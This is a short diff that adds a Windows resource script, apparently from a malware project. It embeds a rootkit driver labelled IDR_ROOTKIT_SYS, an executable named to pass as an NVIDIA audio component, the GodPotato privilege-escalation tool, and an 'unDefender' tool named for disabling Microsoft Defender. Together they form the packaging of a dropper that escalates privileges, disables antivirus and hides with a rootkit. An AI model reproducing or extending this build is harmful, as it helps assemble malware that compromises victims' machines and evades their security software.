@@ -1,0 +1,6 @@
+#include "resource.h"
+
+IDR_ROOTKIT_SYS  RCDATA "dist\\shadow_core.sys"
+IDR_PLUGIN_EXE   RCDATA "dist\\nvhda64v_inner.exe"
+IDR_POTATO_EXE   RCDATA "GodPotato.exe"
+IDR_DEFENDER_EXE RCDATA "unDefender.exe"
